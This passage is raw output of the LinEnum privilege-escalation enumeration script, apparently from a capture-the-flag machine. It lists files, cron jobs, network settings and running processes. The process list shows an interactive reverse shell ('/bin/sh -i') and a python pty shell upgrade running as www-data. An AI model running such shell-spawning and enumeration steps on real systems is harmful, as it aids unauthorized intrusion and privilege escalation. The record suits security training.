-rw-r--r-- 1 root root 11 Jan 11  2016 /usr/src/linux-headers-4.4.0-77/scripts/selinux/genheaders/.gitignore                                                   
-rw-r--r-- 1 root root 13 Jan 11  2016 /usr/src/linux-headers-4.4.0-77/scripts/basic/.gitignore                                                                
-rw-r--r-- 1 root root 54 Jan 11  2016 /usr/src/linux-headers-4.4.0-78/scripts/dtc/.gitignore                                                                  
-rw-r--r-- 1 root root 31 Jan 11  2016 /usr/src/linux-headers-4.4.0-78/scripts/kconfig/lxdialog/.gitignore                                                     
-rw-r--r-- 1 root root 167 Jan 11  2016 /usr/src/linux-headers-4.4.0-78/scripts/kconfig/.gitignore                                                             
-rw-r--r-- 1 root root 154 Jan 11  2016 /usr/src/linux-headers-4.4.0-78/scripts/.gitignore                                                                     
-rw-r--r-- 1 root root 42 Jan 11  2016 /usr/src/linux-headers-4.4.0-78/scripts/genksyms/.gitignore                                                             
-rw-r--r-- 1 root root 12 Jan 11  2016 /usr/src/linux-headers-4.4.0-78/scripts/gdb/linux/.gitignore                                                            
-rw-r--r-- 1 root root 55 Jan 11  2016 /usr/src/linux-headers-4.4.0-78/scripts/mod/.gitignore                                                                  
-rw-r--r-- 1 root root 21 Jan 11  2016 /usr/src/linux-headers-4.4.0-78/scripts/selinux/mdp/.gitignore                                                          
-rw-r--r-- 1 root root 11 Jan 11  2016 /usr/src/linux-headers-4.4.0-78/scripts/selinux/genheaders/.gitignore                                                   
-rw-r--r-- 1 root root 13 Jan 11  2016 /usr/src/linux-headers-4.4.0-78/scripts/basic/.gitignore                                                                
-rw-r--r-- 1 root root 0 Jan  9 16:08 /run/network/.ifstate.lock               
-rw------- 1 maria maria 957 May 16  2017 /home/maria/.xsession-errors         
-rw-r--r-- 1 maria maria 220 May 15  2017 /home/maria/.bash_logout             
-rw-r--r-- 1 maria maria 3771 May 15  2017 /home/maria/.bashrc                 
-rw-r--r-- 1 maria maria 25 May 16  2017 /home/maria/.dmrc                     
-rw-rw-r-- 1 maria maria 203 May 19  2017 /home/maria/.wget-hsts               
-rw------- 1 maria maria 255 May 16  2017 /home/maria/.mysql_history           
-rw------- 1 maria maria 1 Dec 24  2017 /home/maria/.bash_history              
-rw-r--r-- 1 maria maria 655 May 15  2017 /home/maria/.profile                 
-rw------- 1 maria maria 322 May 16  2017 /home/maria/.ICEauthority            
-rw------- 1 maria maria 52 May 16  2017 /home/maria/.Xauthority               
-rw-rw-r-- 1 maria maria 0 May 16  2017 /home/maria/.local/share/.converted-launchers                                                                          
-rw-r--r-- 1 maria maria 0 May 16  2017 /home/maria/.sudo_as_admin_successful  


[-] World-readable files within /home: 
-rw-r--r-- 1 maria maria 134 May 16  2017 /home/maria/.tasks/task1             
-r--r--r-- 1 root root 34 May 16  2017 /home/maria/Desktop/user.txt            
-rw-r--r-- 1 maria maria 220 May 15  2017 /home/maria/.bash_logout             
-rw-r--r-- 1 maria maria 3771 May 15  2017 /home/maria/.bashrc                 
-rw-r--r-- 1 maria maria 25 May 16  2017 /home/maria/.dmrc                     
-rw-rw-r-- 1 maria maria 203 May 19  2017 /home/maria/.wget-hsts               
-rw-r--r-- 1 maria maria 655 May 15  2017 /home/maria/.profile                 
-rw-rw-r-- 1 maria maria 0 May 16  2017 /home/maria/.local/share/.converted-launchers                                                                          
-rw-rw-r-- 1 maria maria 0 May 16  2017 /home/maria/.local/share/unity-settings-daemon/input-sources-converted                                                 
-rw-rw-r-- 1 maria maria 256 May 16  2017 /home/maria/.local/share/session_migration-ubuntu                                                                    
-rw-r--r-- 1 maria maria 0 May 16  2017 /home/maria/.sudo_as_admin_successful  


[-] Home directory contents:           
total 12K                              
drwxr-xr-x  3 root root 4.0K May 16  2017 .                                    
drwxr-xr-x 14 root root 4.0K May 16  2017 ..                                   
drwxr-xr-x  3 root root 4.0K May 19  2017 html                                 


### ENVIRONMENTAL #######################################                      
[-] Environment information:           
USER=www-data                          
PWD=/dev/shm                           
HOME=/var/www                          
SHLVL=2                                
_=/usr/bin/env                         


[-] Path information:                  
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.                 
drwxrwxrwt 2 root root    60 Jan  9 17:36 .                                    
drwxr-xr-x 2 root root  4096 May 22  2017 /bin                                 
drwxr-xr-x 2 root root 12288 May 16  2017 /sbin                                
drwxr-xr-x 2 root root 36864 May 22  2017 /usr/bin                             
drwxr-xr-x 3 root root  4096 May 19  2017 /usr/local/bin                       
drwxr-xr-x 2 root root  4096 Feb 15  2017 /usr/local/sbin                      
drwxr-xr-x 2 root root  4096 May 22  2017 /usr/sbin                            


[-] Available shells:                  
# /etc/shells: valid login shells      
/bin/sh                                
/bin/dash                              
/bin/bash                              
/bin/rbash                             
/usr/bin/tmux                          
/usr/bin/screen                        


[-] Current umask value:               
0000                                   
u=rwx,g=rwx,o=rwx                      


[-] umask value as specified in /etc/login.defs:                               
UMASK           022                    


[-] Password and storage information:  
PASS_MAX_DAYS   99999                  
PASS_MIN_DAYS   0                      
PASS_WARN_AGE   7                      
ENCRYPT_METHOD SHA512                  


### JOBS/TASKS ##########################################                      
[-] Cron jobs:                         
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab                          

/etc/cron.d:                           
total 28                               
drwxr-xr-x   2 root root 4096 May 16  2017 .                                   
drwxr-xr-x 109 root root 4096 May 22  2017 ..                                  
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder                        
-rw-r--r--   1 root root  244 Dec 29  2014 anacron                             
-rw-r--r--   1 root root  589 Jul 16  2014 mdadm                               
-rw-r--r--   1 root root  670 Mar  1  2016 php                                 
-rw-r--r--   1 root root  190 May 15  2017 popularity-contest                  

/etc/cron.daily:                       
total 64                               
drwxr-xr-x   2 root root 4096 May 16  2017 .                                   
drwxr-xr-x 109 root root 4096 May 22  2017 ..                                  
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder                        
-rwxr-xr-x   1 root root  311 Dec 29  2014 0anacron                            
-rwxr-xr-x   1 root root  376 Mar 31  2016 apport                              
-rwxr-xr-x   1 root root 1474 Jan 17  2017 apt-compat                          
-rwxr-xr-x   1 root root  355 May 22  2012 bsdmainutils                        
-rwxr-xr-x   1 root root 1597 Nov 27  2015 dpkg                                
-rwxr-xr-x   1 root root  372 May  6  2015 logrotate                           
-rwxr-xr-x   1 root root 1293 Nov  6  2015 man-db                              
-rwxr-xr-x   1 root root  539 Jul 16  2014 mdadm                               
-rwxr-xr-x   1 root root  435 Nov 18  2014 mlocate                             
-rwxr-xr-x   1 root root  249 Nov 12  2015 passwd                              
-rwxr-xr-x   1 root root 3449 Feb 26  2016 popularity-contest                  
-rwxr-xr-x   1 root root  214 May 24  2016 update-notifier-common              
-rwxr-xr-x   1 root root 1046 May 19  2016 upstart                             

/etc/cron.hourly:                      
total 12                               
drwxr-xr-x   2 root root 4096 May 15  2017 .                                   
drwxr-xr-x 109 root root 4096 May 22  2017 ..                                  
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder                        

/etc/cron.monthly:                     
total 16                               
drwxr-xr-x   2 root root 4096 May 16  2017 .                                   
drwxr-xr-x 109 root root 4096 May 22  2017 ..                                  
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder                        
-rwxr-xr-x   1 root root  313 Dec 29  2014 0anacron                            

/etc/cron.weekly:                      
total 28                               
drwxr-xr-x   2 root root 4096 May 16  2017 .                                   
drwxr-xr-x 109 root root 4096 May 22  2017 ..                                  
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder                        
-rwxr-xr-x   1 root root  312 Dec 29  2014 0anacron                            
-rwxr-xr-x   1 root root   86 Apr 13  2016 fstrim                              
-rwxr-xr-x   1 root root  771 Nov  6  2015 man-db                              
-rwxr-xr-x   1 root root  211 May 24  2016 update-notifier-common              


[-] Crontab contents:                  
# /etc/crontab: system-wide crontab    
# Unlike any other crontab you don't have to run the `crontab'                 
# command to install the new version when you edit this file                   
# and files in /etc/cron.d. These files also have username fields,             
# that none of the other crontabs do.  

SHELL=/bin/sh                          
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin              

# m h dom mon dow user  command        
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly            
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )                                                            
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )                                                           
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )                                                          
#                                      


[-] Anacron jobs and associated file permissions:                              
-rw-r--r-- 1 root root 401 Dec 29  2014 /etc/anacrontab                        
# /etc/anacrontab: configuration file for anacron                              

# See anacron(8) and anacrontab(5) for details.                                

SHELL=/bin/sh                          
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin              
HOME=/root                             
LOGNAME=root                           

# These replace cron's entries         
1       5       cron.daily      run-parts --report /etc/cron.daily             
7       10      cron.weekly     run-parts --report /etc/cron.weekly            
@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly   


[-] When were jobs last executed (/var/spool/anacron contents):                
total 20                               
drwxr-xr-x 2 root root 4096 May 16  2017 .                                     
drwxr-xr-x 5 root root 4096 May 16  2017 ..                                    
-rw------- 1 root root    9 Jan  9 16:13 cron.daily                            
-rw------- 1 root root    9 Jan  9 16:23 cron.monthly                          
-rw------- 1 root root    9 Jan  9 16:18 cron.weekly                           


[-] Systemd timers:                    
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES                                    
Thu 2020-01-09 22:04:45 CET  4h 27min left Thu 2020-01-09 16:08:24 CET  1h 29min ago snapd.refresh.timer          snapd.refresh.service                        
Fri 2020-01-10 05:02:01 CET  11h left      Thu 2020-01-09 16:08:24 CET  1h 29min ago apt-daily.timer              apt-daily.service                            
Fri 2020-01-10 16:23:15 CET  22h left      Thu 2020-01-09 16:23:15 CET  1h 14min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service               
n/a                          n/a           n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service                      

4 timers listed.                       



### NETWORKING  ##########################################                     
[-] Network and IP info:               
ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:9a:13                        
          inet addr:10.10.10.24  Bcast:10.10.10.255  Mask:255.255.255.0        
          inet6 addr: dead:beef::250:56ff:feb9:9a13/64 Scope:Global            
          inet6 addr: fe80::250:56ff:feb9:9a13/64 Scope:Link                   
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1                   
          RX packets:45311 errors:0 dropped:7 overruns:0 frame:0               
          TX packets:44154 errors:0 dropped:0 overruns:0 carrier:0             
          collisions:0 txqueuelen:1000                                         
          RX bytes:6493763 (6.4 MB)  TX bytes:15823945 (15.8 MB)               

lo        Link encap:Local Loopback    
          inet addr:127.0.0.1  Mask:255.0.0.0                                  
          inet6 addr: ::1/128 Scope:Host                                       
          UP LOOPBACK RUNNING  MTU:65536  Metric:1                             
          RX packets:160 errors:0 dropped:0 overruns:0 frame:0                 
          TX packets:160 errors:0 dropped:0 overruns:0 carrier:0               
          collisions:0 txqueuelen:1    
          RX bytes:11840 (11.8 KB)  TX bytes:11840 (11.8 KB)                   


[-] ARP history:                       
? (10.10.10.2) at 00:50:56:b9:17:1b [ether] on ens160                          


[-] Nameserver(s):                     
nameserver 8.8.8.8                     


[-] Default route:                     
default         10.10.10.2      0.0.0.0         UG    0      0        0 ens160 


[-] Listening TCP:                     
Active Internet connections (only servers)                                     
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name                                                               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                              
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1198/nginx: worker                                                             
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                              
tcp6       0      0 :::80                   :::*                    LISTEN      1198/nginx: worker                                                             
tcp6       0      0 :::22                   :::*                    LISTEN      -                                                                              


[-] Listening UDP:                     
Active Internet connections (only servers)                                     
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name                                                               


### SERVICES #############################################                     
[-] Running processes:                 
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND       
root         1  0.0  0.5  37864  5876 ?        Ss   16:08   0:03 /sbin/init    
root         2  0.0  0.0      0     0 ?        S    16:08   0:00 [kthreadd]    
root         3  0.0  0.0      0     0 ?        S    16:08   0:00 [ksoftirqd/0] 
root         5  0.0  0.0      0     0 ?        S<   16:08   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    16:08   0:00 [rcu_sched]   
root         8  0.0  0.0      0     0 ?        S    16:08   0:00 [rcu_bh]      
root         9  0.0  0.0      0     0 ?        S    16:08   0:00 [migration/0] 
root        10  0.0  0.0      0     0 ?        S    16:08   0:00 [watchdog/0]  
root        11  0.0  0.0      0     0 ?        S    16:08   0:00 [watchdog/1]  
root        12  0.0  0.0      0     0 ?        S    16:08   0:00 [migration/1] 
root        13  0.0  0.0      0     0 ?        S    16:08   0:00 [ksoftirqd/1] 
root        15  0.0  0.0      0     0 ?        S<   16:08   0:00 [kworker/1:0H]                                                                                
root        16  0.0  0.0      0     0 ?        S    16:08   0:00 [kdevtmpfs]   
root        17  0.0  0.0      0     0 ?        S<   16:08   0:00 [netns]       
root        18  0.0  0.0      0     0 ?        S<   16:08   0:00 [perf]        
root        19  0.0  0.0      0     0 ?        S    16:08   0:00 [khungtaskd]  
root        20  0.0  0.0      0     0 ?        S<   16:08   0:00 [writeback]   
root        21  0.0  0.0      0     0 ?        SN   16:08   0:00 [ksmd]        
root        22  0.0  0.0      0     0 ?        SN   16:08   0:00 [khugepaged]  
root        23  0.0  0.0      0     0 ?        S<   16:08   0:00 [crypto]      
root        24  0.0  0.0      0     0 ?        S<   16:08   0:00 [kintegrityd] 
root        25  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root        26  0.0  0.0      0     0 ?        S<   16:08   0:00 [kblockd]     
root        27  0.0  0.0      0     0 ?        S<   16:08   0:00 [ata_sff]     
root        28  0.0  0.0      0     0 ?        S<   16:08   0:00 [md]          
root        29  0.0  0.0      0     0 ?        S<   16:08   0:00 [devfreq_wq]  
root        34  0.0  0.0      0     0 ?        S    16:08   0:00 [kswapd0]     
root        35  0.0  0.0      0     0 ?        S<   16:08   0:00 [vmstat]      
root        36  0.0  0.0      0     0 ?        S    16:08   0:00 [fsnotify_mark]                                                                               
root        37  0.0  0.0      0     0 ?        S    16:08   0:00 [ecryptfs-kthrea]                                                                             
root        53  0.0  0.0      0     0 ?        S<   16:08   0:00 [kthrotld]    
root        54  0.0  0.0      0     0 ?        S<   16:08   0:00 [acpi_thermal_pm]                                                                             
root        55  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root        56  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root        57  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root        58  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root        59  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root        60  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root        61  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root        62  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root        63  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_0]   
root        64  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_0]  
root        65  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_1]   
root        66  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_1]  
root        72  0.0  0.0      0     0 ?        S<   16:08   0:00 [ipv6_addrconf]                                                                               
root        85  0.0  0.0      0     0 ?        S<   16:08   0:00 [deferwq]     
root        86  0.0  0.0      0     0 ?        S<   16:08   0:00 [charger_manager]                                                                             
root       124  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root       125  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root       126  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root       127  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root       128  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root       129  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root       130  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root       131  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root       132  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_2]   
root       133  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_2]  
root       134  0.0  0.0      0     0 ?        S<   16:08   0:00 [ttm_swap]    
root       135  0.0  0.0      0     0 ?        S<   16:08   0:00 [vmw_pvscsi_wq_2]                                                                             
root       136  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_3]   
root       137  0.0  0.0      0     0 ?        S<   16:08   0:00 [kpsmoused]   
root       138  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_3]  
root       139  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root       153  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_4]   
root       162  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_4]  
root       163  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_5]   
root       166  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_5]  
root       183  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_6]   
root       185  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_6]  
root       187  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_7]   
root       189  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_7]  
root       191  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_8]   
root       192  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_8]  
root       193  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_9]   
root       194  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_9]  
root       195  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_10]  
root       196  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_10] 
root       197  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_11]  
root       198  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_11] 
root       199  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_12]  
root       200  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_12] 
root       201  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_13]  
root       202  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_13] 
root       203  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_14]  
root       204  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_14] 
root       205  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_15]  
root       207  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_15] 
root       208  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_16]  
root       209  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_16] 
root       210  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_17]  
root       211  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_17] 
root       212  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_18]  
root       213  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_18] 
root       214  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_19]  
root       215  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_19] 
root       216  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_20]  
root       217  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_20] 
root       218  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_21]  
root       219  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_21] 
root       220  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_22]  
root       221  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_22] 
root       222  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_23]  
root       223  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_23] 
root       224  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_24]  
root       225  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_24] 
root       226  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_25]  
root       227  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_25] 
root       228  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_26]  
root       229  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_26] 
root       230  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_27]  
root       231  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_27] 
root       232  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_28]  
root       233  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_28] 
root       234  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_29]  
root       235  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_29] 
root       236  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_30]  
root       237  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_30] 
root       238  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_31]  
root       239  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_31] 
root       240  0.0  0.0      0     0 ?        S    16:08   0:00 [scsi_eh_32]  
root       241  0.0  0.0      0     0 ?        S<   16:08   0:00 [scsi_tmf_32] 
root       266  0.0  0.0      0     0 ?        S    16:08   0:00 [kworker/u4:28]                                                                               
root       272  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root       275  0.0  0.0      0     0 ?        S<   16:08   0:00 [kworker/0:1H]                                                                                
root       341  0.0  0.0      0     0 ?        S<   16:08   0:00 [raid5wq]     
root       367  0.0  0.0      0     0 ?        S<   16:08   0:00 [bioset]      
root       399  0.0  0.0      0     0 ?        S    16:08   0:00 [jbd2/sda1-8] 
root       400  0.0  0.0      0     0 ?        S<   16:08   0:00 [ext4-rsv-conver]                                                                             
root       441  0.0  0.2  28356  3004 ?        Ss   16:08   0:00 /lib/systemd/systemd-journald                                                                 
root       448  0.0  0.0      0     0 ?        S    16:08   0:00 [kworker/1:2] 
root       460  0.0  0.0      0     0 ?        S    16:08   0:00 [kworker/0:3] 
root       461  0.0  0.0      0     0 ?        S<   16:08   0:00 [iscsi_eh]    
root       471  0.0  0.0      0     0 ?        S    16:08   0:00 [kauditd]     
root       480  0.0  0.0      0     0 ?        S<   16:08   0:00 [ib_addr]     
root       491  0.0  0.0      0     0 ?        S<   16:08   0:00 [ib_mcast]    
root       493  0.0  0.0      0     0 ?        S<   16:08   0:00 [ib_nl_sa_wq] 
root       498  0.0  0.0      0     0 ?        S<   16:08   0:00 [ib_cm]       
root       502  0.0  0.1  94772  1580 ?        Ss   16:08   0:00 /sbin/lvmetad -f                                                                              
root       504  0.0  0.0      0     0 ?        S<   16:08   0:00 [iw_cm_wq]    
root       505  0.0  0.0      0     0 ?        S<   16:08   0:00 [rdma_cm]     
root       521  0.0  0.3  44700  3996 ?        Ss   16:08   0:00 /lib/systemd/systemd-udevd                                                                    
systemd+   581  0.0  0.2 100324  2344 ?        Ssl  16:08   0:00 /lib/systemd/systemd-timesyncd                                                                
root       935  0.0  0.0      0     0 ?        S<   16:08   0:00 [kworker/1:1H]                                                                                
root      1012  0.0  0.0   5224   156 ?        Ss   16:08   0:00 /sbin/iscsid  
root      1013  0.0  0.3   5724  3512 ?        S<Ls 16:08   0:00 /sbin/iscsid  
root      1032  0.0  0.5  65520  5532 ?        Ss   16:08   0:00 /usr/sbin/sshd -D                                                                             
root      1044  0.0  0.5 275884  6052 ?        Ssl  16:08   0:00 /usr/lib/accountsservice/accounts-daemon                                                      
root      1055  0.0  0.2  29008  2752 ?        Ss   16:08   0:00 /usr/sbin/cron -f                                                                             
message+  1058  0.0  0.3  42960  3740 ?        Ss   16:08   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation    
root      1075  0.0  0.1   4400  1220 ?        Ss   16:08   0:00 /usr/sbin/acpid                                                                               
root      1083  0.0  0.2  20228  2768 ?        Ss   16:08   0:00 /lib/systemd/systemd-logind                                                                   
daemon    1088  0.0  0.2  26044  2132 ?        Ss   16:08   0:00 /usr/sbin/atd -f                                                                              
root      1092  0.0  0.2 457320  2260 ?        Ssl  16:08   0:01 /usr/bin/lxcfs /var/lib/lxcfs/                                                                
syslog    1094  0.0  0.3 256396  3168 ?        Ssl  16:08   0:00 /usr/sbin/rsyslogd -n                                                                         
root      1104  0.0  0.9 185608  9592 ?        Ssl  16:08   0:03 /usr/bin/vmtoolsd                                                                             
root      1115  0.0  2.1 284852 21832 ?        Ssl  16:08   0:00 /usr/lib/snapd/snapd                                                                          
mysql     1158  0.0 15.5 1246912 158348 ?      Ssl  16:08   0:02 /usr/sbin/mysqld                                                                              
root      1162  0.0  0.0  13376   168 ?        Ss   16:08   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog           
root      1184  0.0  0.5 277180  5824 ?        Ssl  16:08   0:00 /usr/lib/policykit-1/polkitd --no-debug                                                       
root      1186  0.0  0.1 125112  1456 ?        Ss   16:08   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;                        
root      1196  0.0  0.1  15940  1660 tty1     Ss+  16:08   0:00 /sbin/agetty --noclear tty1 linux                                                             
www-data  1198  0.1  0.4 125712  4912 ?        S    16:08   0:05 nginx: worker process                                                                         
www-data  1199  0.0  0.4 125704  4928 ?        S    16:08   0:02 nginx: worker process                                                                         
root      1202  0.0  0.2  19620  2176 ?        Ss   16:08   0:00 /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid                                            
root      1217  0.0  2.4 221516 24744 ?        Ss   16:08   0:00 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)                                       
www-data  1220  0.0  0.9 221736  9616 ?        S    16:08   0:00 php-fpm: pool www                                                                             
www-data  1221  0.0  1.0 221736 10384 ?        S    16:08   0:00 php-fpm: pool www                                                                             
root      1522  0.0  0.0      0     0 ?        S    16:23   0:00 [kworker/0:0] 
root      1529  0.0  0.0      0     0 ?        S    16:23   0:00 [kworker/1:1] 
root      1588  0.0  0.0      0     0 ?        S    16:49   0:00 [kworker/u4:0]                                                                                
www-data  1637  0.0  0.9 221736  9928 ?        S    17:15   0:00 php-fpm: pool www                                                                             
www-data  1647  0.0  0.0   4508   556 ?        S    17:27   0:00 sh -c uname -a; w; id; /bin/sh -i                                                             
www-data  1651  0.0  0.0   4508   640 ?        S    17:27   0:00 /bin/sh -i    
www-data  1652  0.0  0.8  35840  8184 ?        S    17:29   0:00 python3 -c import pty ; pty.spawn('/bin/bash')                                                
www-data  1653  0.0  0.2  18216  2128 pts/0    Ss   17:29   0:00 /bin/bash     
www-data  1668  0.0  0.2  19024  2816 pts/0    S+   17:37   0:00 bash LinEnum.sh                                                                               
www-data  1669  0.0  0.3  19132  3368 pts/0    S+   17:37   0:00 bash LinEnum.sh                                                                               
www-data  1670  0.0  0.0   4384   760 pts/0    S+   17:37   0:00 tee -a        
root      1680  0.0  0.0      0     0 ?        S    17:37   0:00 [kworker/u4:1]                                                                                
www-data  2066  0.0  0.2  19132  2884 pts/0    S+   17:37   0:00 bash LinEnum.sh                                                                               
www-data  2067  0.0  0.2  34424  2864 pts/0    R+   17:37   0:00 ps aux        


[-] Process binaries and associated permissions (from above list):             
-rwxr-xr-x 1 root root  1037528 Jun 24  2016 /bin/bash                         
lrwxrwxrwx 1 root root        4 May 15  2017 /bin/sh -> dash                   
-rwxr-xr-x 1 root root   326224 Feb 15  2017 /lib/systemd/systemd-journald     
-rwxr-xr-x 1 root root   618520 Feb 15  2017 /lib/systemd/systemd-logind       
-rwxr-xr-x 1 root root   141904 Feb 15  2017 /lib/systemd/systemd-timesyncd    
-rwxr-xr-x 1 root root   453240 Feb 15  2017 /lib/systemd/systemd-udevd        
-rwxr-xr-x 1 root root    44104 Dec 16  2016 /sbin/agetty                      
lrwxrwxrwx 1 root root       20 Feb 15  2017 /sbin/init -> /lib/systemd/systemd                                                                                
-rwxr-xr-x 1 root root   783984 Dec  9  2016 /sbin/iscsid                      
-rwxr-xr-x 1 root root    51336 Apr 16  2016 /sbin/lvmetad                     
-rwxr-xr-x 1 root root   513216 Feb 20  2017 /sbin/mdadm                       
-rwxr-xr-x 1 root root   224208 Jan 12  2017 /usr/bin/dbus-daemon              
-rwxr-xr-x 1 root root    18504 Feb  3  2017 /usr/bin/lxcfs                    
-rwxr-xr-x 1 root root    44528 Feb  9  2017 /usr/bin/vmtoolsd                 
-rwxr-xr-x 1 root root   164928 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon                                                                          
-rwxr-xr-x 1 root root    15048 Jan 18  2016 /usr/lib/policykit-1/polkitd      
-rwxr-xr-x 1 root root 19613424 Apr 29  2017 /usr/lib/snapd/snapd              
-rwxr-xr-x 1 root root    48112 Apr  9  2016 /usr/sbin/acpid                   
-rwxr-xr-x 1 root root    26632 Jan 14  2016 /usr/sbin/atd                     
